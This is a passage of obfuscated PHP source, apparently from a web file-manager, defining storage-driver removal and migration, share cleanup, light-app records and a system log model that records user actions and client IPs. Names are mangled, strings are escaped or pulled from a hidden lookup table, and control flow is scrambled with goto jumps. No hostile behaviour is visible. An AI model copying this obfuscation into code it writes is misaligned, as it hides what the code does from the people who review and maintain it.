$cô÷Úö­Â = array(); foreach ($fŒ±ß½èÌ† as $C£Ùº‡Ó¥º) { unset($C£Ùº‡Ó¥º[$céÀ‚áêï‡[192]], $C£Ùº‡Ó¥º[$céÀ‚áêï‡[83]]); $C£Ùº‡Ó¥º[$céÀ‚áêï‡[6]] = json_decode($C£Ùº‡Ó¥º[$céÀ‚áêï‡[6]], !0); $cô÷Úö­Â[] = $C£Ùº‡Ó¥º; } return $cô÷Úö­Â; } public function defaultDriver() { $AÜÖÒ¬ñğì =& $_SERVER[…ë˜õ]; $FâƒôÀÀ¹È = parent::listData(); $cãÅäê©Ø¬ = array_filter_by_field($FâƒôÀÀ¹È, $AÜÖÒ¬ñğì[34], 1); $cãÅäê©Ø¬ = $cãÅäê©Ø¬[0]; if ($cãÅäê©Ø¬) { $cãÅäê©Ø¬[$AÜÖÒ¬ñğì[6]] = json_decode($cãÅäê©Ø¬[$AÜÖÒ¬ñğì[6]], !0); } return $cãÅäê©Ø¬; } public function driverInfo($c®÷†¶íÎŒ) { $FÑÑéÀñÑ£ =& $_SERVER[…ë˜õ]; $dôÎÚ²ƒ = array_to_keyvalue(parent::listData(), $FÑÑéÀñÑ£[388]); if (!isset($dôÎÚ²ƒ[$c®÷†¶íÎŒ])) { return !1; } $EôØÔôÒ¨ = $dôÎÚ²ƒ[$c®÷†¶íÎŒ]; $EôØÔôÒ¨[$FÑÑéÀñÑ£[6]] = json_decode($EôØÔôÒ¨[$FÑÑéÀñÑ£[6]], !0); return $EôØÔôÒ¨; } public function remove($e½¼œî©ßÒ) { $this->removeShareItems($e½¼œî©ßÒ); return parent::remove($e½¼œî©ßÒ); } public function removeWithFile($aùÃñ´õÂÛ, $BˆäĞ…ƒ¶) { goto dÙçå¤’†; A¥¯œµ—¾÷: $døÉ×”ôĞ¸ = Model($DÊé½‘™Ô[444])->where($A™« £©î)->sum($DÊé½‘™Ô[77]); $Cí°»Ú«… = $BˆäĞ…ƒ¶ . $DÊé½‘™Ô[2005] . $aùÃñ´õÂÛ; $B ËŒã‰ÀÊ = new TaskFileTransfer($Cí°»Ú«…, $DÊé½‘™Ô[2000], $cÏæÕƒÄ, LNG($DÊé½‘™Ô[2006]) . "\x28{$aùÃñ´õÂÛ}\51"); goto E½šªÈˆÔã; C¹ª…¢¨èå: if (!$FÁ¹å¡’ÊÌ) { $B ËŒã‰ÀÊ->stop($Cí°»Ú«…); return !1; } $B ËŒã‰ÀÊ->end(); if ($BˆäĞ…ƒ¶ == $DÊé½‘™Ô[1660]) { $this->remove($aùÃñ´õÂÛ); } goto bô¡¨óƒ…ñ; C¥ˆ´Ó¬ : $a™ëƒÛŠ = Model($DÊé½‘™Ô[191])->where($A™« £©î)->field($DÊé½‘™Ô[2007])->select(); foreach ($a™ëƒÛŠ as $F ªîÊŠÌ) { goto Bëâ’ÙŸ•; DèâÓÚğƒ: if (IO::exist($fêÍÊïÇ’)) { $B ËŒã‰ÀÊ->updateFileEnd($F ªîÊŠÌ[$DÊé½‘™Ô[28]], $F ªîÊŠÌ[$DÊé½‘™Ô[77]]); continue; } if (!IO::move($F•¯ÓÔÂ, get_path_father($fêÍÊïÇ’))) { $FÁ¹å¡’ÊÌ = !1; break; } $A™« £©î = array($DÊé½‘™Ô[441] => $F ªîÊŠÌ[$DÊé½‘™Ô[441]]); goto F·ÉÌ°íæ; F·ÉÌ°íæ: $CË¨é°’Ñ¾ = array($DÊé½‘™Ô[789] => $f¾‚¤¤óáÛ, $DÊé½‘™Ô[75] => $fêÍÊïÇ’); Model($DÊé½‘™Ô[191])->where($A™« £©î)->save($CË¨é°’Ñ¾); goto cßÆ‰æïñ; Bëâ’ÙŸ•: $F•¯ÓÔÂ = $F ªîÊŠÌ[$DÊé½‘™Ô[75]]; $fêÍÊïÇ’ = $DÙæËë¤Í . str_replace("\x7b\151\x6f\x3a{$aùÃñ´õÂÛ}\175\x2f", $DÊé½‘™Ô[33], $F•¯ÓÔÂ); if (!IO::exist($F•¯ÓÔÂ)) { $F«…µ«Ÿ¼”[] = $F ªîÊŠÌ[$DÊé½‘™Ô[441]]; $B ËŒã‰ÀÊ->updateFileEnd($F ªîÊŠÌ[$DÊé½‘™Ô[28]], $F ªîÊŠÌ[$DÊé½‘™Ô[77]]); continue; } goto DèâÓÚğƒ; cßÆ‰æïñ: } $this->removeByFileID($F«…µ«Ÿ¼”); goto C¹ª…¢¨èå; E½šªÈˆÔã: $B ËŒã‰ÀÊ->task[$DÊé½‘™Ô[740]] = (double) $døÉ×”ôĞ¸; $båé­ÁÚˆÖ = KodIO::defaultDriver(); $f¾‚¤¤óáÛ = $båé­ÁÚˆÖ[$DÊé½‘™Ô[388]]; goto CÆî™¢Ââò; CÆî™¢Ââò: $DÙæËë¤Í = "\x7b\x69\x6f\72{$f¾‚¤¤óáÛ}\x7d\57"; $FÁ¹å¡’ÊÌ = !0; $F«…µ«Ÿ¼” = array(); goto C¥ˆ´Ó¬ ; dÙçå¤’†: $DÊé½‘™Ô =& $_SERVER[…ë˜õ]; $A™« £©î = array($DÊé½‘™Ô[789] => $aùÃñ´õÂÛ); $cÏæÕƒÄ = Model($DÊé½‘™Ô[444])->where($A™« £©î)->count(); goto A¥¯œµ—¾÷; bô¡¨óƒ…ñ: } public function progress($eôŒ‚ËåÊİ, $EÎÊî„ÂÁ÷) { return Task::get($EÎÊî„ÂÁ÷ . $_SERVER[…ë˜õ][2005] . $eôŒ‚ËåÊİ); } private function removeByFileID($Dµˆ²ëĞ·× = array()) { goto dÀí¼áˆÛ‹; c•¯Ú½„¼ò: foreach ($fîš¥‡“÷… as $f™í¬ó¸‹ˆ) { Model($F‹‡¾ˆ‡ãø[403])->removeNow($f™í¬ó¸‹ˆ, !1); } goto döèó®­¹; C÷ù’ó§å: $fîš¥‡“÷… = Model($F‹‡¾ˆ‡ãø[1209])->where($AŸˆÍóÜì–)->field($F‹‡¾ˆ‡ãø[390])->select(); if (!$fîš¥‡“÷…) { return; } $fîš¥‡“÷… = array_to_keyvalue($fîš¥‡“÷…, $F‹‡¾ˆ‡ãø[33], $F‹‡¾ˆ‡ãø[390]); goto c•¯Ú½„¼ò; dÀí¼áˆÛ‹: $F‹‡¾ˆ‡ãø =& $_SERVER[…ë˜õ]; if (empty($Dµˆ²ëĞ·×)) { return; } $AŸˆÍóÜì– = array($F‹‡¾ˆ‡ãø[441] => array($F‹‡¾ˆ‡ãø[7], $Dµˆ²ëĞ·×)); goto C÷ù’ó§å; döèó®­¹: } private function removeShareItems($fˆ¾ê×íÀÎ) { goto E’ååôÅ¿; E’ååôÅ¿: $F›ÉŒ¬ñ¾ï =& $_SERVER[…ë˜õ]; $d¾ÊàÒÚ” = "\x7b\151\x6f\x3a{$fˆ¾ê×íÀÎ}\175\57"; $eôÒö½‘ = array($F›ÉŒ¬ñ¾ï[390] => 0, $F›ÉŒ¬ñ¾ï[1076] => array($F›ÉŒ¬ñ¾ï[378], "{$d¾ÊàÒÚ”}\45")); goto F¼ØäÆˆÍ´; F¼ØäÆˆÍ´: $e¯›¹§ÙÉÊ = Model($F›ÉŒ¬ñ¾ï[1671])->where($eôÒö½‘)->field($F›ÉŒ¬ñ¾ï[462])->select(); if (empty($e¯›¹§ÙÉÊ)) { return; } $døï¡§Á°¿ = array_to_keyvalue($e¯›¹§ÙÉÊ, $F›ÉŒ¬ñ¾ï[33], $F›ÉŒ¬ñ¾ï[462]); goto DÈ¢ĞÖÖùª; DÈ¢ĞÖÖùª: Model($F›ÉŒ¬ñ¾ï[558])->remove($døï¡§Á°¿); goto AÍóò¦Ö’; AÍóò¦Ö’: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\114\151\147\x68\x74\x41\x70\x70"; public $modelType = "\x53\x79\x73\164\x65\155\117\160\x74\151\x6f\x6e"; public $field = array("\156\x61\155\145", "\147\162\x6f\x75\x70", "\x64\145\163\143", "\x63\x6f\156\x74\x65\156\164"); public function listData($fÊ¹Ø‚ùò† = false, $a¹¢èç”ğÃ = "\x6d\x6f\144\x69\x66\x79\124\x69\155\x65", $CğÉ•Ÿ¹¼ = true) { return parent::listData($fÊ¹Ø‚ùò†, $a¹¢èç”ğÃ, $CğÉ•Ÿ¹¼); } public function remove($AØîÜ‰Üó) { $f§İñ“”¬ = $this->findByName($AØîÜ‰Üó); if (!$f§İñ“”¬) { return !1; } return parent::remove($f§İñ“”¬[$_SERVER[…ë˜õ][388]]); } public function add($d¯ËæäøÚ) { if ($this->findByName($d¯ËæäøÚ[$_SERVER[…ë˜õ][28]])) { return !1; } return parent::insert($d¯ËæäøÚ); } public function update($aº’ƒƒºÂ¥, $FÉÅ¹ê²µ˜) { $FÈ¢‹¬–Òö =& $_SERVER[…ë˜õ]; $cöá³”«ï = $this->findByName($aº’ƒƒºÂ¥); $FÑ‰ì„Šµ = $this->findByName($FÉÅ¹ê²µ˜[$FÈ¢‹¬–Òö[28]]); if (!$cöá³”«ï || $FÑ‰ì„Šµ && $FÑ‰ì„Šµ[$FÈ¢‹¬–Òö[388]] != $cöá³”«ï[$FÈ¢‹¬–Òö[388]]) { return !1; } return parent::update($cöá³”«ï[$FÈ¢‹¬–Òö[388]], $FÉÅ¹ê²µ˜); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\137\154\157\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\151\155\145", "\164\x69\155\145", "\151\x6e\163\145\x72\164", "\x66\165\x6e\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $aâÊ›Ó‰˜Ç =& $_SERVER[…ë˜õ]; return array($aâÊ›Ó‰˜Ç[2008] => LNG($aâÊ›Ó‰˜Ç[2009]), $aâÊ›Ó‰˜Ç[2010] => LNG($aâÊ›Ó‰˜Ç[2011]), $aâÊ›Ó‰˜Ç[1634] => LNG($aâÊ›Ó‰˜Ç[2012]), $aâÊ›Ó‰˜Ç[2013] => LNG($aâÊ›Ó‰˜Ç[2014]), $aâÊ›Ó‰˜Ç[2015] => LNG($aâÊ›Ó‰˜Ç[2016]), $aâÊ›Ó‰˜Ç[2017] => LNG($aâÊ›Ó‰˜Ç[2018]), $aâÊ›Ó‰˜Ç[2019] => LNG($aâÊ›Ó‰˜Ç[2020]), $aâÊ›Ó‰˜Ç[1664] => LNG($aâÊ›Ó‰˜Ç[2020]), $aâÊ›Ó‰˜Ç[1665] => LNG($aâÊ›Ó‰˜Ç[2021]), $aâÊ›Ó‰˜Ç[2022] => LNG($aâÊ›Ó‰˜Ç[2023]), $aâÊ›Ó‰˜Ç[2024] => LNG($aâÊ›Ó‰˜Ç[2025]), $aâÊ›Ó‰˜Ç[2026] => LNG($aâÊ›Ó‰˜Ç[2027]), $aâÊ›Ó‰˜Ç[2028] => LNG($aâÊ›Ó‰˜Ç[2029]), $aâÊ›Ó‰˜Ç[1662] => LNG($aâÊ›Ó‰˜Ç[2030]), $aâÊ›Ó‰˜Ç[1669] => LNG($aâÊ›Ó‰˜Ç[2031]), $aâÊ›Ó‰˜Ç[2032] => LNG($aâÊ›Ó‰˜Ç[2033]), $aâÊ›Ó‰˜Ç[2034] => LNG($aâÊ›Ó‰˜Ç[2035]), $aâÊ›Ó‰˜Ç[2036] => LNG($aâÊ›Ó‰˜Ç[2037]), $aâÊ›Ó‰˜Ç[2038] => LNG($aâÊ›Ó‰˜Ç[2039]), $aâÊ›Ó‰˜Ç[1672] => LNG($aâÊ›Ó‰˜Ç[2040]), $aâÊ›Ó‰˜Ç[1673] => LNG($aâÊ›Ó‰˜Ç[2041]), $aâÊ›Ó‰˜Ç[2042] => LNG($aâÊ›Ó‰˜Ç[2043]), $aâÊ›Ó‰˜Ç[2044] => LNG($aâÊ›Ó‰˜Ç[2045]), $aâÊ›Ó‰˜Ç[2046] => LNG($aâÊ›Ó‰˜Ç[2047]), $aâÊ›Ó‰˜Ç[1667] => LNG($aâÊ›Ó‰˜Ç[2048]), $aâÊ›Ó‰˜Ç[2049] => LNG($aâÊ›Ó‰˜Ç[2050]), $aâÊ›Ó‰˜Ç[1666] => LNG($aâÊ›Ó‰˜Ç[2051]), $aâÊ›Ó‰˜Ç[2052] => LNG($aâÊ›Ó‰˜Ç[2053]), $aâÊ›Ó‰˜Ç[2054] => LNG($aâÊ›Ó‰˜Ç[2055]), $aâÊ›Ó‰˜Ç[2056] => LNG($aâÊ›Ó‰˜Ç[2057]), $aâÊ›Ó‰˜Ç[2058] => LNG($aâÊ›Ó‰˜Ç[2058]), $aâÊ›Ó‰˜Ç[2059] => LNG($aâÊ›Ó‰˜Ç[1638]), $aâÊ›Ó‰˜Ç[2060] => LNG($aâÊ›Ó‰˜Ç[2061]), $aâÊ›Ó‰˜Ç[2062] => LNG($aâÊ›Ó‰˜Ç[2063]), $aâÊ›Ó‰˜Ç[2064] => LNG($aâÊ›Ó‰˜Ç[2065]), $aâÊ›Ó‰˜Ç[2066] => LNG($aâÊ›Ó‰˜Ç[2067]), $aâÊ›Ó‰˜Ç[2068] => LNG($aâÊ›Ó‰˜Ç[2069]), $aâÊ›Ó‰˜Ç[2070] => LNG($aâÊ›Ó‰˜Ç[2070]), $aâÊ›Ó‰˜Ç[2071] => LNG($aâÊ›Ó‰˜Ç[2072]), $aâÊ›Ó‰˜Ç[2073] => LNG($aâÊ›Ó‰˜Ç[2074]), $aâÊ›Ó‰˜Ç[2075] => LNG($aâÊ›Ó‰˜Ç[2076]), $aâÊ›Ó‰˜Ç[2077] => LNG($aâÊ›Ó‰˜Ç[2078]), $aâÊ›Ó‰˜Ç[2079] => LNG($aâÊ›Ó‰˜Ç[2080]), $aâÊ›Ó‰˜Ç[2081] => LNG($aâÊ›Ó‰˜Ç[2082])); } private function typeFile() { $aõòŞâ÷ñÉ =& $_SERVER[…ë˜õ]; $bÉ¼Ø­ŞâĞ = array($aõòŞâ÷ñÉ[1669] => array($aõòŞâ÷ñÉ[1670]), $aõòŞâ÷ñÉ[2026] => array($aõòŞâ÷ñÉ[2083]), $aõòŞâ÷ñÉ[2028] => array($aõòŞâ÷ñÉ[2084]), $aõòŞâ÷ñÉ[1662] => array($aõòŞâ÷ñÉ[1663]), $aõòŞâ÷ñÉ[2034] => array(), $aõòŞâ÷ñÉ[2036] => array(), $aõòŞâ÷ñÉ[2038] => array(), $aõòŞâ÷ñÉ[1672] => array($aõòŞâ÷ñÉ[1674]), $aõòŞâ÷ñÉ[1673] => array($aõòŞâ÷ñÉ[1674]), $aõòŞâ÷ñÉ[2042] => array($aõòŞâ÷ñÉ[2085]), $aõòŞâ÷ñÉ[2044] => array($aõòŞâ÷ñÉ[2085]), $aõòŞâ÷ñÉ[2046] => array($aõòŞâ÷ñÉ[2086]), $aõòŞâ÷ñÉ[2032] => array($aõòŞâ÷ñÉ[2087]), $aõòŞâ÷ñÉ[1667] => array($aõòŞâ÷ñÉ[2088]), $aõòŞâ÷ñÉ[2049] => array($aõòŞâ÷ñÉ[2089]), $aõòŞâ÷ñÉ[1666] => array($aõòŞâ÷ñÉ[1668])); return $bÉ¼Ø­ŞâĞ; } private function typeAll() { goto e†ª£ãÀå·; fÖ­ÏçÍŒ: foreach ($f¼ªè‘ìä— as $cÊŒñ›°òâ => $CËÎÔ¾Å®) { $aÑ§ì™Â[$CËÎÔ¾Å®[0]] = $aÑ§ì™Â[$cÊŒñ›°òâ]; } $aÑ§ì™Â[$d©Ú‡ƒˆµ£[1674]] = LNG($d©Ú‡ƒˆµ£[2090]); $aÑ§ì™Â[$d©Ú‡ƒˆµ£[2085]] = LNG($d©Ú‡ƒˆµ£[2091]); goto FÊòë®Ñ; e†ª£ãÀå·: $d©Ú‡ƒˆµ£ =& $_SERVER[…ë˜õ]; $aÑ§ì™Â = $this->typeList; $f¼ªè‘ìä— = array_filter($this->typeFile()); goto fÖ­ÏçÍŒ; FÊòë®Ñ: return $aÑ§ì™Â; goto d‰ÓÚß™†Ô; d‰ÓÚß™†Ô: } public function addLog($CîÇĞğªç, $B´ì¤³øëĞ = array()) { goto eÅ‚Á¯‹ñ; dƒ±ˆŒõğ±: $B´ì¤³øëĞ = array($bç“¡¢”æª[1521] => Session::sign(), $bç“¡¢”æª[1522] => $EÓÚ¸´ë«„, $bç“¡¢”æª[29] => $CîÇĞğªç, $bç“¡¢”æª[1524] => json_encode($B´ì¤³øëĞ)); parent::add($B´ì¤³øëĞ); goto añÌ‚ßØåğ; eÅ‚Á¯‹ñ: $bç“¡¢”æª =& $_SERVER[…ë˜õ]; if (!isset($this->typeList[$CîÇĞğªç])) { return; } $EÓÚ¸´ë«„ = defined($bç“¡¢”æª[448]) && USER_ID ? USER_ID : (isset($B´ì¤³øëĞ[$bç“¡¢”æª[1531]]) ? $B´ì¤³øëĞ[$bç“¡¢”æª[1531]] : 0); goto F‰Öæíä¡Æ; F‰Öæíä¡Æ: if (!$EÓÚ¸´ë«„) { $EÓÚ¸´ë«„ = (int) Session::get($bç“¡¢”æª[1822]); } $fÕ“ÌÅ³ˆ = get_client_ip(); if (!$B´ì¤³øëĞ || strlen(json_encode($B´ì¤³øëĞ)) >= 1024) { $B´ì¤³øëĞ = array($bç“¡¢”æª[2092] => $fÕ“ÌÅ³ˆ); } else { if (is_array($B´ì¤³øëĞ)) { $B´ì¤³øëĞ[$bç“¡¢”æª[2092]] = $fÕ“ÌÅ³ˆ; } else { $B´ì¤³øëĞ = array($bç“¡¢”æª[1093] => $B´ì¤³øëĞ, $bç“¡¢”æª[2092] => $fÕ“ÌÅ³ˆ); } } goto dƒ±ˆŒõğ±; añÌ‚ßØåğ: } public function remove($CËîˆÇ›¼) { $this->where(array($_SERVER[…ë˜õ][406] => $CËîˆÇ›¼))->delete(); } private function _makeOrder($Bâ½èëìŞ› = '') { goto E†è÷±êËÄ; AÜœ¹ğøã: return $this->order($Bâ½èëìŞ›); goto e“ã÷÷Ò‚š; fÛÖøåñæ–: $eñšô¾Ö–Œ = Input::get($E„…†ÇÍëò[430], $E„…†ÇÍëò[7], $E„…†ÇÍëò[1854], array($E„…†ÇÍëò[1778], $E„…†ÇÍëò[424])); $eñšô¾Ö–Œ = $BóĞ¡¾‰°ª[$eñšô¾Ö–Œ]; $Bâ½èëìŞ› = $Bâ½èëìŞ› . "{$Eï¯Ø™¾†•}\40{$eñšô¾Ö–Œ}"; goto AÜœ¹ğøã; E†è÷±êËÄ: $E„…†ÇÍëò =& $_SERVER[…ë˜õ]; $Eï¯Ø™¾†• = $E„…†ÇÍëò[192]; $BóĞ¡¾‰°ª = array($E„…†ÇÍëò[422] => $E„…†ÇÍëò[423], $E„…†ÇÍëò[424] => $E„…†ÇÍëò[425]); goto fÛÖøåñæ–; e“ã÷÷Ò‚š: } public function get($dô¯ÔŸ²öƒ = '') { goto BŞòÃµ¬ß…; BŞòÃµ¬ß…: $F¢âåª²¥— =& $_SERVER[…ë˜õ]; if (!$dô¯ÔŸ²öƒ) { show_json(array()); } $FÖƒö¹¤æ› = array(); goto dÌÂñ•ª˜•; D ³´ó¹Ï™: $b¤ŒÕŞ“ëÊ[$F¢âåª²¥—[365]] = $this->logList($b¤ŒÕŞ“ëÊ[$F¢âåª²¥—[365]]); return $b¤ŒÕŞ“ëÊ; goto Dõğè×»š; dÌÂñ•ª˜•: if ($dô¯ÔŸ²öƒ[$F¢âåª²¥—[1531]]) { $FÖƒö¹¤æ›[$F¢âåª²¥—[1531]] = $dô¯ÔŸ²öƒ[$F¢âåª²¥—[1531]]; } if (isset($dô¯ÔŸ²öƒ[$F¢âåª²¥—[744]])) { $e¢ô‡¤ä™ = $dô¯ÔŸ²öƒ[$F¢âåª²¥—[744]]; $E †±¡°ø = isset($dô¯ÔŸ²öƒ[$F¢âåª²¥—[470]]) ? $dô¯ÔŸ²öƒ[$F¢âåª²¥—[470]] : time(); $FÖƒö¹¤æ›[$F¢âåª²¥—[192]] = array($F¢âåª²¥—[329], array($e¢ô‡¤ä™, $E †±¡°ø)); } if ($dô¯ÔŸ²öƒ[$F¢âåª²¥—[29]]) { $aÃ‘ ½òŠ = explode($F¢âåª²¥—[47], $dô¯ÔŸ²öƒ[$F¢âåª²¥—[29]]); $DÓÛÎÑëõà = $this->typeFile(); $A¿’ãäê…ğ = array(); foreach ($aÃ‘ ½òŠ as $C°ŠÃÇÈŠ²) { $A¿’ãäê…ğ[] = $C°ŠÃÇÈŠ²; if (isset($DÓÛÎÑëõà[$C°ŠÃÇÈŠ²])) { $A¿’ãäê…ğ = array_merge($A¿’ãäê…ğ, $DÓÛÎÑëõà[$C°ŠÃÇÈŠ²]); } } $A¿’ãäê…ğ = array_unique($A¿’ãäê…ğ); if ($A¿’ãäê…ğ) { $FÖƒö¹¤æ›[$F¢âåª²¥—[29]] = array($F¢âåª²¥—[7], $A¿’ãäê…ğ); } } else { $FÖƒö¹¤æ›[$F¢âåª²¥—[29]] = array($F¢âåª²¥—[2093], $F¢âåª²¥—[2094]); } goto b°ô‘¥µ ; b°ô‘¥µ : if (!empty($dô¯ÔŸ²öƒ[$F¢âåª²¥—[2092]])) { $FÖƒö¹¤æ›[$F¢âåª²¥—[425]] = array($F¢âåª²¥—[378], "\45{$dô¯ÔŸ²öƒ[$F¢âåª²¥—[2092]]}\x25"); } $b¤ŒÕŞ“ëÊ = $this->_makeOrder()->where($FÖƒö¹¤æ›)->selectPage(); if (empty($b¤ŒÕŞ“ëÊ[$F¢âåª²¥—[365]])) { show_json(array(), !0, $b¤ŒÕŞ“ëÊ[$F¢âåª²¥—[362]]); } goto D ³´ó¹Ï™; Dõğè×»š: } private function ipAddress(&$aÂ…İ¶Ü¤·) { $Cã†ä³ô =& $_SERVER[…ë˜õ]; if (!empty($aÂ…İ¶Ü¤·[$Cã†ä³ô[2092]])) { $a˜ĞÂçğâ  = IpLocation::get($aÂ…İ¶Ü¤·[$Cã†ä³ô[2092]]); } else { $a˜ĞÂçğâ  = LNG($Cã†ä³ô[2095]); } $aÂ…İ¶Ü¤·[$Cã†ä³ô[2096]] = $a˜ĞÂçğâ ; } private function descZipDownload($E¡¿íËóÍ­, &$aéùíƒ½Ú) { $DËª–ó´ë =& $_SERVER[…ë˜õ]; if (!isset($E¡¿íËóÍ­[$DËª–ó´ë[2097]])) { return; } $a¬¾ù–Œ = json_decode($E¡¿íËóÍ­[$DËª–ó´ë[2097]], !0); foreach ($a¬¾ù–Œ as $Eâæ…°²Â) { try { $eÊ„Œ½‹²Ä = IO::infoFull($Eâæ…°²Â[$DËª–ó´ë[75]]); } catch (Exception $a…½ÔèÂ‡) { continue; } $E¡¿íËóÍ­[$DËª–ó´ë[75]] = $Eâæ…°²Â[$DËª–ó´ë[75]]; $aéùíƒ½Ú[] = $E¡¿íËóÍ­[$DËª–ó´ë[390]] = $eÊ„Œ½‹²Ä[$DËª–ó´ë[390]]; $aéùíƒ½Ú[] = $E¡¿íËóÍ­[$DËª–ó´ë[1910]] = $eÊ„Œ½‹²Ä[$DËª–ó´ë[472]]; break; } return $E¡¿íËóÍ­; } private function getSourceList(&$b‰¢ÁøíÈ) { $eùã™ ì÷“ =& $_SERVER[…ë˜õ]; $cÍ‚áËİ¢Í = array(); foreach ($b‰¢ÁøíÈ as $cãï‡ƒõ¥Ş => $c‚ƒ‹²¡Œ©) { goto Fòñíô¶±í; A´¨êµ„„: $cÍ‚áËİ¢Í[] = $cÛ•ù™Ë«·[$eùã™ ì÷“[390]]; $cÍ‚áËİ¢Í[] = $cÛ•ù™Ë«·[$eùã™ ì÷“[1910]]; if ($cÛ•ù™Ë«·[$eùã™ ì÷“[29]] == $eùã™ ì÷“[515]) { $cÍ‚áËİ¢Í[] = $cÛ•ù™Ë«·[$eùã™ ì÷“[425]][$eùã™ ì÷“[1060]]; $cÍ‚áËİ¢Í[] = $cÛ•ù™Ë«·[$eùã™ ì÷“[425]][$eùã™ ì÷“[1061]]; } goto A˜ÂÈÊ²‘¢; A˜ÂÈÊ²‘¢: if ($cÛ•ù™Ë«·[$eùã™ ì÷“[29]] == $eùã™ ì÷“[1918]) { $cÍ‚áËİ¢Í[] = $cÛ•ù™Ë«·[$eùã™ ì÷“[425]][$eùã™ ì÷“[390]]; } goto Cê›¢ÄƒÂ–; Fòñíô¶±í: $cÛ•ù™Ë«· = json_decode($c‚ƒ‹²¡Œ©[$eùã™ ì÷“[425]], !0); if ($c‚ƒ‹²¡Œ©[$eùã™ ì÷“[29]] == $eùã™ ì÷“[1665]) { $cÛ•ù™Ë«· = $this->descZipDownload($cÛ•ù™Ë«·, $cÍ‚áËİ¢Í); $b‰¢ÁøíÈ[$cãï‡ƒõ¥Ş][$eùã™ ì÷“[425]] = json_encode($cÛ•ù™Ë«·); continue; } if (strpos($c‚ƒ‹²¡Œ©[$eùã™ ì÷“[29]], $eùã™ ì÷“[1911]) !== 0) { if (!isset($cÛ•ù™Ë«·[$eùã™ ì÷“[75]]) || strpos($c‚ƒ‹²¡Œ©[$eùã™ ì÷“[29]], $eùã™ ì÷“[2098]) !== 0) { continue; } try { $DŞ‡ÖŒ¸© = IO::infoFull($cÛ•ù™Ë«·[$eùã™ ì÷“[75]]); } catch (Exception $e–İ–¤Š‰) { continue; } $cÍ‚áËİ¢Í[] = $cÛ•ù™Ë«·[$eùã™ ì÷“[390]] = $DŞ‡ÖŒ¸©[$eùã™ ì÷“[390]]; $cÍ‚áËİ¢Í[] = $cÛ•ù™Ë«·[$eùã™ ì÷“[1910]] = $DŞ‡ÖŒ¸©[$eùã™ ì÷“[472]]; $b‰¢ÁøíÈ[$cãï‡ƒõ¥Ş][$eùã™ ì÷“[425]] = json_encode($cÛ•ù™Ë«·); continue; } goto A´¨êµ„„; Cê›¢ÄƒÂ–: } if (!$cÍ‚áËİ¢Í) { return array(); } return Model($eùã™ ì÷“[796])->sourceListInfo($cÍ‚áËİ¢Í, !0); } private function logList($A£¦·á½»è) { goto D¤ÍÎô§Ë¼; CùíåÌŸŠ: $f„±ˆîí¬ = $this->getSourceList($A£¦·á½»è); $FÔô©ØêŸ± = $this->typeAll(); $a¦‹Áí¡›¼ = array(); goto B¿·ñÊÒ‰; B¿·ñÊÒ‰: $aŸÃèŒŠÅ = array(); foreach ($A£¦·á½»è as $c„…ñòÉ…µ => $AÓ‹ˆ¥Ÿµï) { goto BàñÙšİø½; Cã¨¤õ•¤: $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[28]] = isset($Bó¥í“áã[$AÙëßŞ¦ÁŠ[28]]) ? $Bó¥í“áã[$AÙëßŞ¦ÁŠ[28]] : LNG($AÙëßŞ¦ÁŠ[2095]); $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[1960]] = isset($Bó¥í“áã[$AÙëßŞ¦ÁŠ[1960]]) ? $Bó¥í“áã[$AÙëßŞ¦ÁŠ[1960]] : $AÙëßŞ¦ÁŠ[33]; $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[1436]] = isset($FÔô©ØêŸ±[$BØõº¦Ğ]) ? $FÔô©ØêŸ±[$BØõº¦Ğ] : $Fà£–ÜÄÚÀ; goto F–ÕßíÔ”¯; BàñÙšİø½: $BØõº¦Ğ = $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[29]]; $Bó¥í“áã = isset($c¥‹Ñî÷çÔ[$AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[1531]]]) ? $c¥‹Ñî÷çÔ[$AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[1531]]] : !1; $Fà£–ÜÄÚÀ = strpos($BØõº¦Ğ, $AÙëßŞ¦ÁŠ[2099]) === 0 ? LNG($AÙëßŞ¦ÁŠ[2100]) : LNG($AÙëßŞ¦ÁŠ[2095]); goto Cã¨¤õ•¤; bÓÄ·÷‰¡: $this->ipAddress($AÓ‹ˆ¥Ÿµï); if (strpos($BØõº¦Ğ, $AÙëßŞ¦ÁŠ[1911]) === 0 || isset($Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[1910]])) { goto F´µÈœİÑÒ; F´µÈœİÑÒ: $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[84]] = $f„±ˆîí¬[$Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[390]]]; $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[1923]] = $f„±ˆîí¬[$Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[1910]]]; if ($Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[29]] == $AÙëßŞ¦ÁŠ[515]) { $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[425]][$AÙëßŞ¦ÁŠ[1060]] = $f„±ˆîí¬[$Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[425]][$AÙëßŞ¦ÁŠ[1060]]]; $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[425]][$AÙëßŞ¦ÁŠ[1061]] = $f„±ˆîí¬[$Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[425]][$AÙëßŞ¦ÁŠ[1061]]]; } goto DÚò’ÆØ‰¿; eÒµŒ©Ú„Ò: if ($Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[1923]] && $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[1923]][$AÙëßŞ¦ÁŠ[398]] == $AÙëßŞ¦ÁŠ[1174]) { $aŸÃèŒŠÅ[] = $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[388]]; unset($A£¦·á½»è[$c„…ñòÉ…µ]); continue; } goto e½àö‘¶; DÚò’ÆØ‰¿: if ($Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[29]] == $AÙëßŞ¦ÁŠ[1918]) { 